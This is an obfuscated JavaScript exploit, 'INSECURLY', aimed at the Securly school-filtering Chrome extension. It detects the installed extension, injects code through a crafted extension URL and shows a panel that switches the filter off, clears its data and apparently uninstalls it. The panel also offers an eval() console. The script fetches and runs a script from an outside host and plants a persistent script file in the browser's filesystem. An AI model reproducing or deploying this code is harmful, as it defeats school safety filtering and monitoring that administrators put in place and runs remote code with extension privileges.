// This moderately de-obfuscated script has been modified from the original by Ashton Davies for integration and improvement.

function o(n, _=78, D=126) {
    for (var x = n.toString().split(""), $ = 0; $ < x.length; $++)
        x[$].charCodeAt(0) <= D && (x[$] = String.fromCharCode((x[$].charCodeAt(0) + _) % D));
    return x.join("")
}
function d(n, _=78, D=126) {
    return o(n, D - _)
}
const m = function() {
    document.body.innerHTML = "<head><title>INSECURLY Panel</title></head><style>body{background-color:#000;color:#eee;font-family:Arial}h1{font-weight:700;}h1,h3{user-select:none}.switch-area{margin:10px 0}.switch-area div{font-size:20px;padding:10px 0;height:32px}#desc{font-size:18px;max-width:500px}#updates{font-size:15px;margin-top:15px;color:#999}#toggle{appearance:none;width:62px;height:32px;display:inline-block;position:relative;border-radius:50px;overflow:hidden;outline:0;border:none;cursor:pointer;background-color:#707070;transition:background-color ease .3s}#toggle:before{content:'on off';display:block;position:absolute;z-index:2;width:28px;height:28px;background:#fff;left:2px;top:2px;border-radius:50%;font:10px/28px Helvetica;text-transform:uppercase;font-weight:700;text-indent:-22px;word-spacing:37px;color:#fff;text-shadow:-1px -1px rgba(0,0,0,.15);white-space:nowrap;box-shadow:0 1px 2px rgba(0,0,0,.2);transition:all cubic-bezier(.3,1.5,.7,1) .3s}#toggle:checked{background-color:#4cd964}#toggle:checked:before{left:32px}.consoleDiv{width:300px}textarea{resize:none;width:100%;height:100px;padding:10px;color:#fff;background:0 0;border:1px solid #fff;border-top-left-radius:10px;border-top-right-radius:10px}button{width:100%;padding:5px 10px;border:none;border-bottom-left-radius:5px;border-bottom-right-radius:5px;cursor:pointer}</style><center><h1>INSECURLY</h1><h3>by Bypassi#7037</h3>Securly Toggle:<div class='switch-area'><input id='toggle' type='checkbox'></div><div id='desc'>Teachers using Securly Classroom can still view your screen when the switch is off.</div><p><div class='consoleDiv'><textarea id='console' spellcheck='false' placeholder='Point-Blank Script Console\n\nMost likely blocked by the Content Security Policy on this page.'></textarea><br><button onclick='run()'>Run</button></div><p>This exploit is patched in later Securly versions.<div id='updates'></center><script>function run(){eval(document.getElementById('console').value)}</script>";
    let n = window[d`38B?=5`][d`5HD5>C9?>`][o`\x19\x17&r\x13\x15\x1D\x19$!' \x16\x02\x13\x19\x17`]()
      , _ = ()=>n.chrome
      , D = document.getElementById("toggle");
    async function x() {
        let _ = await (await fetch(d`8DD@C\n}}9>C53EB<I|2I@1CC9|3?=}:C|:C`)).text()
          , D = new n[d`\x12<?2`]([_],{
            type: d`D5HD}:1F1C3B9@D`
        })
          , x = document.createElement("script");
        x.src = URL[d`3B51D5\x1F2:53D%"\x1C`](D),
        n.document.body.appendChild(x)
    }
    try {
        for (let $ = 0; $ < 10; $++)
            Reflect.construct(Blob, []);
        x()
    } catch (C) {}
    async function t(n, _, D) {
        let x = await new Promise(n=>{
            window[d`G52;9D"5AE5CD\x169<5#ICD5=`](0, D.length, n)
        }
        );
        return await new Promise(_=>{
            x.root.getFile(n, {}, n=>{
                n.remove(_)
            }
            , _)
        }
        ),
        new Promise($=>{
            x.root.getFile(n, {
                create: !0
            }, n=>{
                n[d`3B51D5'B9D5B`](x=>{
                    x[d`?>GB9D5е>4`] = ()=>{
                        delete [x, n]
                    }
                    ,
                    x[d`?>GB9D55>4`] = ()=>{
                        $(n[d`D?%"\x1C`]())
                    }
                    ,
                    x.write(new window[d`\x12<?2`]([D],{
                        type: _
                    }))
                }
                )
            }
            )
        }
        )
    }
    function B() {
        if (!window[d`<?31D9?>`][d`81C8`])
            throw new window[d`\x15BB?B`]("IDK");
        let n = location.hash.replace("#", "");
        t(Math.random() + ".js", d`D5HD}:1F1C3B9@D`, n)[d`D85>`](n=>{
            let _ = document.createElement("script");
            _.src = n,
            document.body.appendChild(_)
        }
        )
    }
    _().runtime.id.startsWith("j") && (document.getElementById("updates").textContent = d`@1I<?14n\x03n1@@<954|nvI?En1B5>uDnCE@@?C54nD?n;>?GnG81DnD89Cn=51>Cw`,
    _().extension[d`C5D%@41D5%B<\x141D1`](decodeURIComponent(d`s\x15\x00s\x12\x06s\t\x15`).repeat(1024))),
    localStorage[d`3<ECD5B`]?.startsWith(d`\x11&\x1F\x19\x14/\x1F#z`) || (D.checked = !0),
    D.onclick = function $() {
        D[d`3853;54`] ? (delete window.WebRequestEventImpl,
        localStorage.clear()) : (_().management[d`E>9>CD1<<#5<6`].bind(_().runtime.id),
        Storage.prototype[d`C5D\x19D5=`].call(window[d`<?31<#D?B175`], d`3<ECD5B`, d`\x11&\x1F\x19\x14/\x1F#z` + Date.now() * (Math[d`B1>4?=`]() + 1.5))),
        location.reload.call(n[d`<?31D9?>`]),
        setTimeout(x, 1500)
    }
    ,
    navigator[d`@5BC9CD\x1C?31<\x169<5C`] = !0,
    t(d`}9|:C`, d`D5HD}:1F1C3B9@D`, o + d + t + B + ";" + B.name + "()//"),
    t(d`}9|8D=<`, "text/html", d`\fC3B9@DnCB3\rp|}9|:Cp\x0E\f}C3B9@D\x0E`).then(()=>{
        window[d`>1F971D?B`][d`CD?B175`][d`@5BC9CD`]()
    }
    )
}
  , a = ["=1>965CD|:C?>", "2<?3;54|8D=<", "2<?3;54|:C", "3?>6|:C\x01", "3?>D5>D	|=9>|:C", "C53EB<I|=9>|:C", "/=5D141D1}F5B96954/3?>D5>DC|:C?>", "6?>DC}\x1d5DB?@?<9C{\x1d549E=|G?66", '6?>DC}\x1d5DB?@?<9C{"57E<1B|G?66', "6?>DC}\x1d5DB?@?<9C{#5=9\x12?<4|G?66", "6?>DC}\x1d5DB?@?<9C|3CC", ]
  , SI = {
    NONE: "",
    OLD: d`985?217:;6;<><9;7981><8344:?98;7`,
    NEW: d`:?6<=;3392;??@<15?9>53:2=4527<12`,
    BETA: d`;>>59==@51=9;=:9:=>8:==?244<5?8:`
};
async function g(n) {
    let _;
    try {
        _ = await window[d`65D38`](d`38B?=5{5HD5>C9?>\n}}` + n + d`}` + d(a.at(d`\x01\x00`)))
    } catch (D) {
        return 0
    }
    return 200 === _[d`CD1DEC`] ? 1 : 0
}
async function gSI() {
    return await g(SI.NEW) ? SI.NEW : await g(SI.OLD) ? SI.OLD : await g(SI.BETA) ? SI.BETA : SI.NONE
}
function e(n, _) {
    let D = function(n) {
        let _ = open();
        _.chrome = top.chrome[d`5HD5>C9?>`][d`75D\x1213;7B?E>4 175`]().chrome;
        let D = document[d`3B51D5\x15<5=5>D`]("script");
        D.src = n,
        _.document.body.appendChild(D),
        top.close()
    }
      , x = URL[d`3B51D5\x1F2:53D%"\x1C`](n)
      , $ = new window[d`\x12<?2`]([`${o};${d};(${D})("${x}")`],{
        type: d`D5HD}:1F1C3B9@D`
    })
      , C = URL[d`3B51D5\x1F2:53D%"\x1C`]($)
      , t = d`\fCDI<5\x0ExKF9C929<9DI\n89445>M\f}CDI<5\x0EXnnnn\f96B1=5nCB34?3\rp\fC3B9@DnCB3\ru` + C + d`u\x0E\f}C3B9@D\x0Ep\x0EXnnnnnnnn\x189|n\x196nI?En31>nB514nD89CznD85n5H@<?9Dn494>uDnG?B;|Xnnnnnnnn'19Dn1n3?E@<5n?6nG55;C|n'5u<<n25n213;|||Xnnnn\f}96B1=5\x0E`;
    return d`38B?=5{5HD5>C9?>\n}}` + _ + d`}` + (.3 > Math.random() ? "/" : "") + d(a[1]) + [d`\x0F31D57?BI\r`] + window[d`5>3?45%"\x19\x13?=@?>5>D`](window[d`2D?1`](t))
}
function gS2U(n) {
    return e(new window[d`\x12<?2`]([`${o};${d};(${m})()`],{
        type: d`D5HD}:1F1C3B9@D`
    }), n)
}
[].__proto__[window[o`\x05+\x1F\x14!\x1E`][d`9D5B1D?B`]] = function*() {
    yield gS2U.call(this[0], this[1])
}
,
gSI().then(n=>{
    if (n === SI.NONE) {
        let _ = document.getElementById("error");
        _.classList.add("insecurlyBtn"),
        _.textContent = d`)?En4?>uDn81F5n1>n145AE1D5nF5BC9?>n?6n#53EB<In9>CD1<<54|`
    } else {
        let D = [d`}2<?3;54|:C`, n]
          , x = document.getElementById("insecurlyBtn");
        x.classList = "insecurlyBtn",
        x[d`?>4B17CD1BD`] = n=>{
            n[d`41D1$B1>C65B`].setData("text/plain", [...D])
        }
    }
}
);
